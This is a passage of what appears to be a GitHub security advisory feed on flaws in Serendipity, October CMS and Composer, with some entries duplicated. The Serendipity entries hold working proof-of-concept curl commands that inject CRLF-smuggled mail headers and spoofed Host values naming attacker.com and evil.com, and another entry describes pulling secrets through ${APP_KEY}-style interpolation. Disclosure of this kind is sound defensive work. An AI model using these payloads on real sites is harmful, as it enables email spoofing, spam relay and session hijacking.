<li><a href="https://github.com/WWBN/AVideo/commit/d5992fff2811df4adad1d9fc7d0a5837b882aed7">https://github.com/WWBN/AVideo/commit/d5992fff2811df4adad1d9fc7d0a5837b882aed7</a></li>
<li><a href="https://github.com/advisories/GHSA-gpgp-w4x2-h3h7">https://github.com/advisories/GHSA-gpgp-w4x2-h3h7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gpgp-w4x2-h3h7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T22:49:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s9y/serendipity] Serendipity has a Host Header Injection allows SMTP header injection via unvalidated HTTP_HOST in Message-ID email header]]></title>
        <id>https://github.com/advisories/GHSA-458g-q4fh-mj6r</id>
        <link href="https://github.com/advisories/GHSA-458g-q4fh-mj6r"/>
        <updated>2026-04-14T22:32:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Serendipity inserts <code>$_SERVER['HTTP_HOST']</code> directly into the <code>Message-ID</code> SMTP header without any validation beyond CRLF stripping. An attacker who can control the <code>Host</code> header during an email-triggering action can inject arbitrary SMTP headers into outgoing emails, enabling spam relay, BCC injection, and email spoofing.</p>
<h3 id="details">Details</h3>
<p>In <code>include/functions.inc.php:548</code>:</p>
<pre><code class="language-php">$maildata['headers'][] = 'Message-ID: &lt;' 
    . bin2hex(random_bytes(16)) 
    . '@' . $_SERVER['HTTP_HOST']  // ← unsanitized, attacker-controlled
    . '&gt;';
</code></pre>
<p>The existing sanitization function only blocks <code>\r\n</code> and URL-encoded variants:</p>
<pre><code class="language-php">function serendipity_isResponseClean($d) {
    return (strpos($d, "\r") === false &amp;&amp; strpos($d, "\n") === false 
        &amp;&amp; stripos($d, "%0A") === false &amp;&amp; stripos($d, "%0D") === false);
}
</code></pre>
<p>Critically, <code>serendipity_isResponseClean()</code> is <strong>not even called</strong> on <code>HTTP_HOST</code> before embedding it into the mail headers — making this exploitable with any character that SMTP interprets as a header delimiter.</p>
<p>Email is triggered by actions such as:</p>
<ul>
<li>New comment notifications to blog owner</li>
<li>Comment subscription notifications to subscribers</li>
<li>Password reset emails (if configured)</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash"># Trigger comment notification email with injected header
curl -s -X POST \
  -H "Host: attacker.com&gt;\r\nBcc: victim@evil.com\r\nX-Injected:" \
  -d "serendipity[comment]=test&amp;serendipity[name]=hacker&amp;serendipity[email]=a@b.com&amp;serendipity[entry_id]=1" \
  http://[TARGET]/comment.php
</code></pre>
<p>Resulting malicious <code>Message-ID</code> header in outgoing email:</p>
<pre><code>Message-ID: &lt;deadbeef@attacker.com&gt;
Bcc: victim@evil.com
X-Injected: &gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>An attacker can control the domain portion of the <code>Message-ID</code> header in all outgoing emails sent by Serendipity (comment notifications, subscriptions). 
This enables:</p>
<ul>
<li><strong>Identity spoofing</strong> — emails appear to originate from attacker-controlled domain</li>
<li><strong>Reply hijacking</strong> — some mail clients use Message-ID for threading, pointing replies toward attacker infrastructure</li>
<li><strong>Email reputation abuse</strong> — attacker's domain embedded in legitimate mail headers</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Sanitize <code>HTTP_HOST</code> before embedding in mail headers, and restrict to valid hostname characters only:</p>
<pre><code class="language-php">$safe_host = preg_replace('/[^a-zA-Z0-9.\-]/', '', 
    parse_url('http://' . $_SERVER['HTTP_HOST'], PHP_URL_HOST)
);
$maildata['headers'][] = 'Message-ID: ';
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/s9y/Serendipity/security/advisories/GHSA-458g-q4fh-mj6r">https://github.com/s9y/Serendipity/security/advisories/GHSA-458g-q4fh-mj6r</a></li>
<li><a href="https://github.com/advisories/GHSA-458g-q4fh-mj6r">https://github.com/advisories/GHSA-458g-q4fh-mj6r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-458g-q4fh-mj6r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-14T22:32:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[s9y/serendipity] Serendipity has a Host Header Injection allows authentication cookie scoping to attacker-controlled domain in functions_config.inc.php]]></title>
        <id>https://github.com/advisories/GHSA-4m6c-649p-f6gf</id>
        <link href="https://github.com/advisories/GHSA-4m6c-649p-f6gf"/>
        <updated>2026-04-14T22:32:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>serendipity_setCookie()</code> function uses <code>$_SERVER['HTTP_HOST']</code> without validation as the <code>domain</code> parameter of <code>setcookie()</code>. An attacker can force authentication cookies — including session tokens and auto-login tokens — to be scoped to an attacker-controlled domain, facilitating session hijacking.</p>
<h3 id="details">Details</h3>
<p>In <code>include/functions_config.inc.php:726</code>:</p>
<pre><code class="language-php">function serendipity_setCookie($name, $value, $securebyprot = true, ...) {
    $host = $_SERVER['HTTP_HOST']; // ← attacker-controlled, no validation

    if ($securebyprot) {
        if ($pos = strpos($host, ":")) {
            $host = substr($host, 0, $pos); // strips port only
        }
    }

    setcookie("serendipity[$name]", $value, [
        'domain'   =&gt; $host,   // ← poisoned domain
        'httponly' =&gt; $httpOnly,
        'samesite' =&gt; 'Strict'
    ]);
}
</code></pre>
<p>This function is called during login with sensitive cookies:</p>
<pre><code class="language-php">// functions_config.inc.php:455-498
serendipity_setCookie('author_autologintoken', $rnd, true, false, true);
serendipity_setCookie('author_username', $user);
serendipity_setCookie('author_token', $hash);
</code></pre>
<p>If an attacker can influence the <code>Host</code> header at login time (e.g. via MITM, reverse proxy misconfiguration, or load balancer), authentication cookies are issued scoped to the attacker's domain instead of the legitimate one.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-bash">curl -v -X POST \
  -H "Host: attacker.com" \
  -d "serendipity[user]=admin&amp;serendipity[pass]=admin" \
  http://[TARGET]/serendipity_admin.php 2&gt;&amp;1 | grep -i "set-cookie"
</code></pre>
<p>Expected output:</p>
<pre><code class="language-http">Set-Cookie: serendipity[author_token]=; domain=attacker.com; HttpOnly
</code></pre>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Session fixation</strong> — attacker pre-sets a cookie scoped to their domain, then tricks the victim into authenticating, inheriting the poisoned token</li>
<li><strong>Token leakage</strong> — <code>author_autologintoken</code> scoped to wrong domain may be sent to attacker-controlled infrastructure</li>
<li><strong>Privilege escalation</strong> — if admin logs in under a poisoned Host header, their admin token is compromised</li>
</ul>
<h3 id="suggested-fix">Suggested Fix</h3>
<p>Validate <code>HTTP_HOST</code> against the configured <code>$serendipity['url']</code> before use:</p>
<pre><code class="language-php">function serendipity_setCookie($name, $value, ...) {
    global $serendipity;
    $configured = parse_url($serendipity['url'], PHP_URL_HOST);
    $host = preg_replace('/:[0-9]+$/', '', $_SERVER['HTTP_HOST']);
    $host = ($host === $configured) ? $host : $configured;

    setcookie("serendipity[$name]", $value, [
        'domain' =&gt; $host,
        ...
    ]);
}
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/s9y/Serendipity/security/advisories/GHSA-4m6c-649p-f6gf">https://github.com/s9y/Serendipity/security/advisories/GHSA-4m6c-649p-f6gf</a></li>
<li><a href="https://github.com/advisories/GHSA-4m6c-649p-f6gf">https://github.com/advisories/GHSA-4m6c-649p-f6gf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4m6c-649p-f6gf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T22:32:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/rain] October Rain has Stored XSS via SVG Filter Bypass]]></title>
        <id>https://github.com/advisories/GHSA-gcqv-f29m-67gr</id>
        <link href="https://github.com/advisories/GHSA-gcqv-f29m-67gr"/>
        <updated>2026-04-14T22:29:51.000Z</updated>
        <content type="html"><![CDATA[<p>A stored cross-site scripting (XSS) vulnerability was identified in the SVG sanitization logic. The regex pattern used to strip <code>on*</code> event handler attributes could be bypassed using a crafted payload that exploits how the pattern matches attribute boundaries.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Stored XSS via malicious SVG files uploaded through the Media Manager</li>
<li>Could allow privilege escalation if a superuser views or embeds the malicious SVG</li>
<li>Requires authenticated backend access with media upload permissions (<code>media.library.create</code>)</li>
<li>SVG must be viewed or embedded in a page to trigger</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v3.7.14 and v4.1.10. All users are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Disable SVG uploads by adding <code>svg</code> to the blocked extensions in media configuration</li>
<li>Set <code>media.clean_vectors</code> to <code>true</code> in configuration (enabled by default)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by Offensive Security Research Team</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-gcqv-f29m-67gr">https://github.com/octobercms/october/security/advisories/GHSA-gcqv-f29m-67gr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25133">https://nvd.nist.gov/vuln/detail/CVE-2026-25133</a></li>
<li><a href="https://github.com/advisories/GHSA-gcqv-f29m-67gr">https://github.com/advisories/GHSA-gcqv-f29m-67gr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcqv-f29m-67gr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T22:29:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/rain] October Rain has Stored XSS via SVG Filter Bypass]]></title>
        <id>https://github.com/advisories/GHSA-gcqv-f29m-67gr</id>
        <link href="https://github.com/advisories/GHSA-gcqv-f29m-67gr"/>
        <updated>2026-04-14T22:29:51.000Z</updated>
        <content type="html"><![CDATA[<p>A stored cross-site scripting (XSS) vulnerability was identified in the SVG sanitization logic. The regex pattern used to strip <code>on*</code> event handler attributes could be bypassed using a crafted payload that exploits how the pattern matches attribute boundaries.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Stored XSS via malicious SVG files uploaded through the Media Manager</li>
<li>Could allow privilege escalation if a superuser views or embeds the malicious SVG</li>
<li>Requires authenticated backend access with media upload permissions (<code>media.library.create</code>)</li>
<li>SVG must be viewed or embedded in a page to trigger</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v3.7.14 and v4.1.10. All users are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Disable SVG uploads by adding <code>svg</code> to the blocked extensions in media configuration</li>
<li>Set <code>media.clean_vectors</code> to <code>true</code> in configuration (enabled by default)</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by Offensive Security Research Team</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-gcqv-f29m-67gr">https://github.com/octobercms/october/security/advisories/GHSA-gcqv-f29m-67gr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25133">https://nvd.nist.gov/vuln/detail/CVE-2026-25133</a></li>
<li><a href="https://github.com/advisories/GHSA-gcqv-f29m-67gr">https://github.com/advisories/GHSA-gcqv-f29m-67gr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gcqv-f29m-67gr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T22:29:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/rain] October Rain has Environment Variable Exfiltration via INI Parser Interpolation]]></title>
        <id>https://github.com/advisories/GHSA-g6v3-wv4j-x9hg</id>
        <link href="https://github.com/advisories/GHSA-g6v3-wv4j-x9hg"/>
        <updated>2026-04-14T22:29:43.000Z</updated>
        <content type="html"><![CDATA[<p>A server-side information disclosure vulnerability was identified in the INI settings parser. PHP's <code>parse_ini_string()</code> function supports <code>${}</code> syntax for environment variable interpolation. Attackers with Editor access could inject <code>${APP_KEY}</code>, <code>${DB_PASSWORD}</code>, or similar patterns into CMS page settings fields, causing sensitive environment variables to be resolved and stored in the template. These values were then returned to the attacker when the page was reopened.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Exfiltration of sensitive environment variables (APP_KEY, DB credentials, AWS keys, etc.)</li>
<li>Could enable further attacks: database access, cookie forgery, AWS resource access</li>
<li>Requires authenticated backend access with Editor permissions</li>
<li>Only relevant when <code>cms.safe_mode</code> is enabled (otherwise direct PHP injection is already possible)</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v3.7.14 and v4.1.10. All users are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Restrict Editor tool access to fully trusted administrators only</li>
<li>Ensure database and cloud service credentials are not accessible from the web server's network</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by Proactive Testing Team (PTT)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-g6v3-wv4j-x9hg">https://github.com/octobercms/october/security/advisories/GHSA-g6v3-wv4j-x9hg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25125">https://nvd.nist.gov/vuln/detail/CVE-2026-25125</a></li>
<li><a href="https://github.com/advisories/GHSA-g6v3-wv4j-x9hg">https://github.com/advisories/GHSA-g6v3-wv4j-x9hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6v3-wv4j-x9hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T22:29:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/rain] October Rain has Environment Variable Exfiltration via INI Parser Interpolation]]></title>
        <id>https://github.com/advisories/GHSA-g6v3-wv4j-x9hg</id>
        <link href="https://github.com/advisories/GHSA-g6v3-wv4j-x9hg"/>
        <updated>2026-04-14T22:29:43.000Z</updated>
        <content type="html"><![CDATA[<p>A server-side information disclosure vulnerability was identified in the INI settings parser. PHP's <code>parse_ini_string()</code> function supports <code>${}</code> syntax for environment variable interpolation. Attackers with Editor access could inject <code>${APP_KEY}</code>, <code>${DB_PASSWORD}</code>, or similar patterns into CMS page settings fields, causing sensitive environment variables to be resolved and stored in the template. These values were then returned to the attacker when the page was reopened.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Exfiltration of sensitive environment variables (APP_KEY, DB credentials, AWS keys, etc.)</li>
<li>Could enable further attacks: database access, cookie forgery, AWS resource access</li>
<li>Requires authenticated backend access with Editor permissions</li>
<li>Only relevant when <code>cms.safe_mode</code> is enabled (otherwise direct PHP injection is already possible)</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v3.7.14 and v4.1.10. All users are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Restrict Editor tool access to fully trusted administrators only</li>
<li>Ensure database and cloud service credentials are not accessible from the web server's network</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by Proactive Testing Team (PTT)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-g6v3-wv4j-x9hg">https://github.com/octobercms/october/security/advisories/GHSA-g6v3-wv4j-x9hg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25125">https://nvd.nist.gov/vuln/detail/CVE-2026-25125</a></li>
<li><a href="https://github.com/advisories/GHSA-g6v3-wv4j-x9hg">https://github.com/advisories/GHSA-g6v3-wv4j-x9hg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g6v3-wv4j-x9hg</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T22:29:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[composer/composer] Composer has a command injection via malicious perforce repository]]></title>
        <id>https://github.com/advisories/GHSA-wg36-wvj6-r67p</id>
        <link href="https://github.com/advisories/GHSA-wg36-wvj6-r67p"/>
        <updated>2026-04-14T20:03:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>Perforce::generateP4Command()</code> method constructed shell commands by interpolating user-supplied Perforce connection parameters (port, user, client) without proper escaping. An attacker controlling a repository configuration in a malicious composer.json declaring a Perforce VCS repository could inject arbitrary commands through these values, leading to command execution in the context of the user running Composer. Composer would execute these injected commands even if Perforce is not installed.</p>
<p>VCS repositories are only loaded from the root composer.json file located in the directory you execute Composer commands in and from the composer config directory (e.g. <code>~/.config/composer/composer.json</code>). So this vulnerability cannot be exploited through composer.json files of packages installed as dependencies.</p>
<p>You are at risk of command execution if you run Composer commands on untrusted projects with attacker supplied composer.json files, regardless of whether you or any of your dependencies use Perforce.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in Composer 2.2.27 (2.2 LTS) and 2.9.6 (mainline)</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Carefully inspect composer.json files before running Composer on them. Verify that Perforce-related fields contain valid values.</li>
<li>Only run Composer commands on projects from trusted sources.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/composer/composer/security/advisories/GHSA-wg36-wvj6-r67p">https://github.com/composer/composer/security/advisories/GHSA-wg36-wvj6-r67p</a></li>
<li><a href="https://github.com/advisories/GHSA-wg36-wvj6-r67p">https://github.com/advisories/GHSA-wg36-wvj6-r67p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wg36-wvj6-r67p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-14T20:03:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[composer/composer] Composer has a command injection via malicious perforce repository]]></title>
        <id>https://github.com/advisories/GHSA-wg36-wvj6-r67p</id>
        <link href="https://github.com/advisories/GHSA-wg36-wvj6-r67p"/>
        <updated>2026-04-14T20:03:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The <code>Perforce::generateP4Command()</code> method constructed shell commands by interpolating user-supplied Perforce connection parameters (port, user, client) without proper escaping. An attacker controlling a repository configuration in a malicious composer.json declaring a Perforce VCS repository could inject arbitrary commands through these values, leading to command execution in the context of the user running Composer. Composer would execute these injected commands even if Perforce is not installed.</p>
<p>VCS repositories are only loaded from the root composer.json file located in the directory you execute Composer commands in and from the composer config directory (e.g. <code>~/.config/composer/composer.json</code>). So this vulnerability cannot be exploited through composer.json files of packages installed as dependencies.</p>
<p>You are at risk of command execution if you run Composer commands on untrusted projects with attacker supplied composer.json files, regardless of whether you or any of your dependencies use Perforce.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in Composer 2.2.27 (2.2 LTS) and 2.9.6 (mainline)</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Carefully inspect composer.json files before running Composer on them. Verify that Perforce-related fields contain valid values.</li>
<li>Only run Composer commands on projects from trusted sources.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/composer/composer/security/advisories/GHSA-wg36-wvj6-r67p">https://github.com/composer/composer/security/advisories/GHSA-wg36-wvj6-r67p</a></li>
<li><a href="https://github.com/advisories/GHSA-wg36-wvj6-r67p">https://github.com/advisories/GHSA-wg36-wvj6-r67p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wg36-wvj6-r67p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-04-14T20:03:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/system] October CMS has Stored XSS in Event Log Mail Preview]]></title>
        <id>https://github.com/advisories/GHSA-j4j5-9x6g-rgxc</id>
        <link href="https://github.com/advisories/GHSA-j4j5-9x6g-rgxc"/>
        <updated>2026-04-14T20:02:51.000Z</updated>
        <content type="html"><![CDATA[<p>A stored cross-site scripting (XSS) vulnerability was identified in the Event Log mail preview feature. When viewing logged mail messages, HTML content was rendered in an iframe without proper sandboxing, allowing JavaScript execution in the viewer's browser context.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Stored XSS via mail template content rendered in Event Log</li>
<li>Could allow privilege escalation if a superuser views a malicious log entry</li>
<li>Requires authenticated backend access with mail template editing permissions</li>
<li>Requires a superuser to view the specific Event Log entry to trigger</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v3.7.14 and v4.1.10. All users are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Restrict mail template editing permissions to fully trusted administrators only</li>
<li>Restrict Event Log viewing permissions to minimize exposure</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by <a href="https://github.com/neosprings">Chris Alupului</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-j4j5-9x6g-rgxc">https://github.com/octobercms/october/security/advisories/GHSA-j4j5-9x6g-rgxc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24907">https://nvd.nist.gov/vuln/detail/CVE-2026-24907</a></li>
<li><a href="https://github.com/advisories/GHSA-j4j5-9x6g-rgxc">https://github.com/advisories/GHSA-j4j5-9x6g-rgxc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j4j5-9x6g-rgxc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T20:02:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/system] October CMS has Stored XSS in Event Log Mail Preview]]></title>
        <id>https://github.com/advisories/GHSA-j4j5-9x6g-rgxc</id>
        <link href="https://github.com/advisories/GHSA-j4j5-9x6g-rgxc"/>
        <updated>2026-04-14T20:02:51.000Z</updated>
        <content type="html"><![CDATA[<p>A stored cross-site scripting (XSS) vulnerability was identified in the Event Log mail preview feature. When viewing logged mail messages, HTML content was rendered in an iframe without proper sandboxing, allowing JavaScript execution in the viewer's browser context.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Stored XSS via mail template content rendered in Event Log</li>
<li>Could allow privilege escalation if a superuser views a malicious log entry</li>
<li>Requires authenticated backend access with mail template editing permissions</li>
<li>Requires a superuser to view the specific Event Log entry to trigger</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v3.7.14 and v4.1.10. All users are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Restrict mail template editing permissions to fully trusted administrators only</li>
<li>Restrict Event Log viewing permissions to minimize exposure</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by <a href="https://github.com/neosprings">Chris Alupului</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-j4j5-9x6g-rgxc">https://github.com/octobercms/october/security/advisories/GHSA-j4j5-9x6g-rgxc</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24907">https://nvd.nist.gov/vuln/detail/CVE-2026-24907</a></li>
<li><a href="https://github.com/advisories/GHSA-j4j5-9x6g-rgxc">https://github.com/advisories/GHSA-j4j5-9x6g-rgxc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j4j5-9x6g-rgxc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T20:02:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/system] October CMS has Stored XSS in Backend Editor Markup Classes]]></title>
        <id>https://github.com/advisories/GHSA-6qmh-j78v-ffp7</id>
        <link href="https://github.com/advisories/GHSA-6qmh-j78v-ffp7"/>
        <updated>2026-04-14T20:02:33.000Z</updated>
        <content type="html"><![CDATA[<p>A stored cross-site scripting (XSS) vulnerability was identified in the Backend Editor Settings. The Markup Classes fields (used for paragraph styles, inline styles, table styles, etc.) did not sanitize input to valid CSS class name characters. Malicious values were rendered unsanitized in Froala editor dropdown menus, allowing JavaScript execution when any user opened a RichEditor.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Stored XSS via editor settings rendered in RichEditor dropdowns</li>
<li>Could allow privilege escalation if a superuser opens any RichEditor (e.g., editing a blog post)</li>
<li>Requires authenticated backend access with editor settings permissions</li>
<li>Triggers on routine content editing operations</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v3.7.14 and v4.1.10. All users are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Restrict editor settings permissions to fully trusted administrators only</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by <a href="https://github.com/neosprings">Chris Alupului</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-6qmh-j78v-ffp7">https://github.com/octobercms/october/security/advisories/GHSA-6qmh-j78v-ffp7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24906">https://nvd.nist.gov/vuln/detail/CVE-2026-24906</a></li>
<li><a href="https://github.com/advisories/GHSA-6qmh-j78v-ffp7">https://github.com/advisories/GHSA-6qmh-j78v-ffp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qmh-j78v-ffp7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T20:02:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/system] October CMS has Stored XSS in Backend Editor Markup Classes]]></title>
        <id>https://github.com/advisories/GHSA-6qmh-j78v-ffp7</id>
        <link href="https://github.com/advisories/GHSA-6qmh-j78v-ffp7"/>
        <updated>2026-04-14T20:02:33.000Z</updated>
        <content type="html"><![CDATA[<p>A stored cross-site scripting (XSS) vulnerability was identified in the Backend Editor Settings. The Markup Classes fields (used for paragraph styles, inline styles, table styles, etc.) did not sanitize input to valid CSS class name characters. Malicious values were rendered unsanitized in Froala editor dropdown menus, allowing JavaScript execution when any user opened a RichEditor.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Stored XSS via editor settings rendered in RichEditor dropdowns</li>
<li>Could allow privilege escalation if a superuser opens any RichEditor (e.g., editing a blog post)</li>
<li>Requires authenticated backend access with editor settings permissions</li>
<li>Triggers on routine content editing operations</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v3.7.14 and v4.1.10. All users are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
<li>Restrict editor settings permissions to fully trusted administrators only</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li>Reported by <a href="https://github.com/neosprings">Chris Alupului</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/octobercms/october/security/advisories/GHSA-6qmh-j78v-ffp7">https://github.com/octobercms/october/security/advisories/GHSA-6qmh-j78v-ffp7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-24906">https://nvd.nist.gov/vuln/detail/CVE-2026-24906</a></li>
<li><a href="https://github.com/advisories/GHSA-6qmh-j78v-ffp7">https://github.com/advisories/GHSA-6qmh-j78v-ffp7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qmh-j78v-ffp7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-14T20:02:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[october/rain] October Rain has a Twig Sandbox Bypass via Collection Methods]]></title>
        <id>https://github.com/advisories/GHSA-m5qg-jc75-4jp6</id>
        <link href="https://github.com/advisories/GHSA-m5qg-jc75-4jp6"/>
        <updated>2026-04-14T20:02:06.000Z</updated>
        <content type="html"><![CDATA[<p>A sandbox bypass vulnerability was identified in the optional Twig safe mode feature (<code>CMS_SAFE_MODE</code>). Certain methods on the <code>collect()</code> helper were not properly restricted, allowing authenticated users with template editing permissions to bypass sandbox protections.</p>
<h3 id="impact">Impact</h3>
<ul>
<li>Bypass of Twig sandbox restrictions</li>
<li>Only affects installations with <code>CMS_SAFE_MODE</code> enabled (disabled by default)</li>
<li>Requires authenticated backend access with CMS template editing permissions</li>
</ul>
<h3 id="patches">Patches</h3>
<p>The vulnerability has been patched in v4.1.5 and v3.7.13. All users who have enabled safe mode are encouraged to upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrading immediately is not possible:</p>
<ul>
